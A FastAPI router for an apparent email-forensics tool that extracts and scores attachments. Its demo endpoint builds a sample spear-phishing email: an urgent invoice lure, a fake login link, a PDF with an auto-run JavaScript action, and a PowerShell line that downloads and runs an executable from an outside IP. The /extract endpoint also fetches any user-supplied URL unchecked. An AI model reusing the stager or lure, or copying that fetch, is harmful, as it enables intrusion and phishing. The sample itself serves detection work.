"""
Email Attachment Extractor & Direct Ingestion Endpoints
Permits extracting and analyzing file attachments directly from .eml / .msg emails
without requiring the user to download the files to their local disk.
"""

import base64
import io
import urllib.request
from typing import Optional, Dict, Any
from datetime import datetime, timezone
from fastapi import APIRouter, Depends, UploadFile, File, Form, HTTPException, Request
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession

from backend.app.database.session import get_db
import json
from backend.app.models.investigation import Investigation, EvidenceItem, AttackGraph, ForensicReport
from backend.app.schemas.forensics import InvestigationSummarySchema
from backend.app.services.email_extraction.extractor import email_extraction_service
from backend.app.services.ingestion.quarantine import ingestion_service
from backend.app.services.static_analysis.analyzer import static_forensics_engine
from backend.app.services.feature_engineering.extractor import feature_extractor
from backend.app.services.ml_engine.model import ml_engine
from backend.app.services.ml_engine.risk_scorer import risk_scorer
from backend.app.services.attack_graph.builder import attack_graph_builder
from backend.app.services.explainable_ai.explainer import xai_engine
from backend.app.services.report_generation.generator import forensic_report_generator

router = APIRouter()


class EmailTextPayload(BaseModel):
    raw_email: Optional[str] = None
    email_url: Optional[str] = None


class AnalyzeExtractedAttachmentPayload(BaseModel):
    filename: str
    data_base64: str
    content_type: Optional[str] = "application/octet-stream"


@router.post("/extract")
async def extract_email_attachments(
    request: Request,
    file: Optional[UploadFile] = File(None)
):
    """
    Extracts all attachments and security metadata from an uploaded .eml / .msg file,
    pasted raw RFC 822 email text, or an email attachment URL.
    Supports both multipart form-data (file upload) and JSON payload.
    """
    data = b""
    original_name = "email_message.eml"
    content_type = request.headers.get("content-type", "")

    if "application/json" in content_type:
        try:
            body = await request.json()
            raw_text = body.get("raw_email", "")
            url = body.get("email_url", "")
            if raw_text:
                data = raw_text.encode("utf-8")
                original_name = "pasted_email.eml"
            elif url:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ARGUS Security Scanner"}
                )
                with urllib.request.urlopen(req, timeout=10) as response:
                    data = response.read()
                original_name = url.split("/")[-1] or "downloaded_email.eml"
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Failed to process JSON email request: {str(e)}")
    else:
        # Form / Multipart
        form = await request.form()
        uploaded_file = form.get("file")
        raw_text = form.get("raw_email")
        url = form.get("email_url")

        if uploaded_file and hasattr(uploaded_file, "read"):
            data = await uploaded_file.read()
            original_name = getattr(uploaded_file, "filename", "message.eml") or "message.eml"
        elif raw_text and isinstance(raw_text, str):
            data = raw_text.encode("utf-8")
            original_name = "pasted_email.eml"
        elif url and isinstance(url, str):
            try:
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ARGUS Security Scanner"}
                )
                with urllib.request.urlopen(req, timeout=10) as response:
                    data = response.read()
                original_name = url.split("/")[-1] or "downloaded_email.eml"
            except Exception as e:
                raise HTTPException(status_code=400, detail=f"Failed to fetch email from URL: {str(e)}")

    if not data or len(data) == 0:
        raise HTTPException(status_code=400, detail="Please upload an .eml/.msg file or provide email text.")
        raise HTTPException(status_code=400, detail="Empty email content received.")

    result = email_extraction_service.parse_email(data, original_name)
    return result


@router.post("/analyze-attachment", response_model=InvestigationSummarySchema)
async def analyze_extracted_attachment(
    payload: AnalyzeExtractedAttachmentPayload,
    db: AsyncSession = Depends(get_db)
):
    """
    Directly analyzes an in-memory attachment extracted from an email without
    the user needing to download it to their local machine.
    """
    try:
        raw_bytes = base64.b64decode(payload.data_base64)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid base64 payload: {str(e)}")

    if len(raw_bytes) == 0:
        raise HTTPException(status_code=400, detail="Empty attachment data.")

    # Wrap raw bytes in a mock UploadFile
    upload_file = UploadFile(
        file=io.BytesIO(raw_bytes),
        filename=payload.filename,
        headers={"content-type": payload.content_type or "application/octet-stream"}
    )

    # 1. Ingestion & Quarantine
    ingest_meta = await ingestion_service.ingest_upload(upload_file)

    inv_id = ingest_meta["investigation_id"]
    file_path = ingest_meta["file_path"]
    original_name = ingest_meta["original_name"]
    file_type = ingest_meta["file_type"]
    sha256 = ingest_meta["sha256"]
    file_size = ingest_meta["file_size_bytes"]

    # Create Initial Investigation Record
    investigation = Investigation(
        id=inv_id,
        original_name=original_name,
        stored_name=ingest_meta["stored_name"],
        file_path=file_path,
        sha256=sha256,
        file_size_bytes=file_size,
        file_type=file_type,
        status="PROCESSING",
        created_at=datetime.now(timezone.utc)
    )
    db.add(investigation)
    await db.commit()

    try:
        # 2. Static Digital Forensics
        evidence_dicts = static_forensics_engine.analyze_file(
            file_path=file_path,
            original_name=original_name,
            file_type=file_type
        )

        # 3. Feature Extraction
        features = feature_extractor.extract_features(file_size, evidence_dicts)

        # 4. Machine Learning Inference & Anomaly Scoring
        ml_prediction = ml_engine.predict(features)

        # 5. Risk Quantification
        risk_result = risk_scorer.calculate_risk(
            evidence_items=evidence_dicts,
            ml_prediction=ml_prediction,
            behavioral_events=[],
            correlations=[],
            file_type=file_type,
            file_size_bytes=file_size
        )

        # 6. Attack Graph Construction
        graph_dict = attack_graph_builder.build_graph(
            investigation_id=inv_id,
            sample_name=original_name,
            sha256=sha256,
            evidence_items=evidence_dicts,
            behavioral_events=[],
            correlations=[],
            file_type=file_type,
            file_size_bytes=file_size,
            risk_score=risk_result["risk_score"],
            risk_level=risk_result["risk_level"],
            created_at=investigation.created_at.isoformat()
        )

        # 7. Explainable AI & Defensive Playbook
        xai_result = await xai_engine.generate_explanation(
            investigation_id=inv_id,
            sample_name=original_name,
            sha256=sha256,
            file_type=file_type,
            file_size_bytes=file_size,
            risk_score=risk_result["risk_score"],
            risk_level=risk_result["risk_level"],
            evidence_items=evidence_dicts,
            ml_prediction=ml_prediction,
            behavioral_events=[],
            correlations=[]
        )

        # 8. Report Generation (JSON & PDF)
        inv_dict = {
            "id": inv_id,
            "original_name": original_name,
            "sha256": sha256,
            "file_size_bytes": file_size,
            "file_type": file_type,
            "created_at": investigation.created_at.isoformat()
        }
        json_report = forensic_report_generator.generate_json_report(
            investigation=inv_dict,
            evidence_items=evidence_dicts,
            ml_prediction=ml_prediction,
            risk_data=risk_result,
            behavioral_events=[],
            correlations=[],
            graph_data=graph_dict,
            xai_data=xai_result
        )

        pdf_path = forensic_report_generator.generate_pdf_report(
            investigation_id=inv_id,
            json_report=json_report
        )

        # 9. Persist Evidence Items to Database
        for item in evidence_dicts:
            ev_record = EvidenceItem(
                investigation_id=inv_id,
                category=item["category"],
                title=item["title"],
                description=item["description"],
                severity=item["severity"],
                observed_value=item["observed_value"],
                extraction_source=item["extraction_source"],
                offset_or_location=item.get("offset_or_location"),
                explanation=item["explanation"],
                confidence=item["confidence"],
                limitations=item.get("limitations")
            )
            db.add(ev_record)

        # Persist Attack Graph
        attack_graph_record = AttackGraph(
            investigation_id=inv_id,
            nodes_json=json.dumps(graph_dict["nodes"]),
            edges_json=json.dumps(graph_dict["edges"]),
            summary=graph_dict["summary"],
            missing_evidence_notes=graph_dict.get("missing_evidence_notes"),
            timeline_json=json.dumps(graph_dict.get("timeline", []))
        )
        db.add(attack_graph_record)

        # Persist Forensic Report
        report_record = ForensicReport(
            investigation_id=inv_id,
            executive_summary=xai_result["executive_summary"],
            pdf_path=pdf_path,
            json_data=json.dumps(json_report, default=str),
            defensive_actions=json.dumps(xai_result["defensive_actions"], default=str),
            limitations_disclaimer=xai_result["limitations_disclaimer"],
            generated_by=xai_result["generated_by"]
        )
        db.add(report_record)

        # Update Investigation Status
        investigation.status = "COMPLETED"
        investigation.risk_score = risk_result["risk_score"]
        investigation.risk_level = risk_result["risk_level"]
        investigation.confidence_score = risk_result["confidence_score"]
        investigation.coverage_score = risk_result["coverage_score"]
        investigation.summary = xai_result["executive_summary"]
        investigation.completed_at = datetime.now(timezone.utc)

        await db.commit()
        await db.refresh(investigation)

        return investigation

    except Exception as e:
        investigation.status = "FAILED"
        investigation.error_message = str(e)
        investigation.completed_at = datetime.now(timezone.utc)
        await db.commit()
        raise HTTPException(status_code=500, detail=f"Forensic pipeline error: {str(e)}")


@router.get("/demo-sample")
async def get_demo_email():
    """
    Returns a sample spear-phishing .eml with an embedded exploit PDF and a PowerShell stager.
    """
    sample_pdf_b64 = "JVBERi0xLjQKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZy9QYWdlcyAyIDAgUi9PcGVuQWN0aW9uIDQgMCBSPj5lbmRvYmoKMiAwIG9iajw8L1R5cGUvUGFnZXMvS2lkc1tdL0NvdW50IDA+PmVuZG9iago0IDAgb2JqPDwvVHlwZS9BY3Rpb24vUy9KYXZhU2NyaXB0L0pTKGFwcC5hbGVydCgiaHR0cDovL21hbGljaW91cy1jMi5vcmcvZXhlIik7KT4+ZW5kb2JqCnhyZWYKMCA1CnRyYWlsZXI8PC9TaXplIDUvUm9vdCAxIDAgUj4+CnN0YXJ0eHJlZgoxMTAKJSVFT0Y="
    sample_ps1_b64 = base64.b64encode(b"$c = New-Object System.Net.WebClient; $c.DownloadFile('http://185.196.11.42/agent.exe', '$env:TEMP/agent.exe'); Start-Process '$env:TEMP/agent.exe'").decode("ascii")

    eml_content = f"""From: "Accounts Department" <billing@secure-finance-portal.net>
To: "Finance Team" <employee@corporate-domain.com>
Subject: URGENT: Overdue Invoice Payment & Bank Transfer Statement #INV-98241
Date: Fri, 27 Nov 2026 09:30:00 +0530
Message-ID: <20261127.INV98241@secure-finance-portal.net>
Authentication-Results: spf=fail (sender IP 185.196.11.42); dkim=fail
Received: from mail.secure-finance-portal.net [185.196.11.42] by mx.corporate-domain.com
Content-Type: multipart/mixed; boundary="ARGUS_EMAIL_BOUNDARY_2026"

--ARGUS_EMAIL_BOUNDARY_2026
Content-Type: text/plain; charset="utf-8"

Dear Valued Customer,

Please find attached the revised invoice details and bank remittance statement.
Failure to settle the outstanding balance within 24 hours will result in legal escalation.

Review the attached PDF statement immediately. You can also view details online at:
https://secure-login-portal-verification.xyz/auth

Regards,
Accounts & Billing Department

--ARGUS_EMAIL_BOUNDARY_2026
Content-Type: application/pdf; name="Overdue_Invoice_Statement.pdf"
Content-Disposition: attachment; filename="Overdue_Invoice_Statement.pdf"
Content-Transfer-Encoding: base64

{sample_pdf_b64}

--ARGUS_EMAIL_BOUNDARY_2026
Content-Type: text/plain; name="auto_payment_sync.ps1"
Content-Disposition: attachment; filename="auto_payment_sync.ps1"
Content-Transfer-Encoding: base64

{sample_ps1_b64}

--ARGUS_EMAIL_BOUNDARY_2026--"""

    return {
        "filename": "Phishing_Invoice_Sample.eml",
        "raw_eml": eml_content
    }
